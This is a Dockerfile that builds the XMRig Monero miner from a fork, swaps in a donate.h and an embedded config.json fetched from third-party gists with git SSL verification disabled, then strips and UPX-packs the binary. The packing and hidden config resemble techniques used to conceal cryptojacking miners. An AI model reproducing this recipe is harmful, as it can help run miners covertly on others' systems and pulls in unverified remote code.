ARG VERSION=master
FROM  alpine:3.9
RUN   adduser -S -D -H -h /xmrig miner && \
      apk --no-cache upgrade && \
      apk --no-cache add \
        git \
        cmake \
        libuv-dev \
        upx binutils build-base libmicrohttpd-dev openssl-dev && \
      apk add --no-cache -X http://dl-cdn.alpinelinux.org/alpine/edge/testing hwloc hwloc-dev && \
      git config --global http.sslVerify false && git clone https://github.com/MoneroOcean/xmrig && \
      cd xmrig && \
      git fetch --tags && \
      git checkout ${VERSION} && \
      git submodule update --init --recursive && \
      rm src/donate.h && \
      wget https://gist.githubusercontent.com/dsomeone/138a503bbd9f4c41980e0668f2eed179/raw/876aaa119ea8c1769105129dc661a970b9c086a7/donate.h -P src/ && \
      mkdir build && \
      cd build && \
      wget https://gist.githubusercontent.com/dsomeone/e03975b7e89d8bcbc5f156b277e8b2c9/raw/3060af10a6ea9084e45e39f028f62a0fc51e05a3/config.json && \
      cmake -DWITH_CN_GPU=OFF -DWITH_EMBEDDED_CONFIG=ON -DCMAKE_BUILD_TYPE=Release .. && \
      make && \
      rm -rf ./src Makefile CMakeFiles CMakeCache.txt && \
      find . -name '*cmake*' -delete && \
      rm -rf ../doc  ../res  ../src ../CHANGELOG.md  ../CMakeLists.txt  ../LICENSE  ../README.md ../.git ../cmake && \
      strip --strip-all -s -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag xmrig && \
      upx -9 --8mib-ram --lzma xmrig && \
      apk del --no-cache --purge \
        build-base \
        cmake \
        git upx binutils
USER miner
EXPOSE 80
WORKDIR    /xmrig/build
ENTRYPOINT ["./xmrig"]
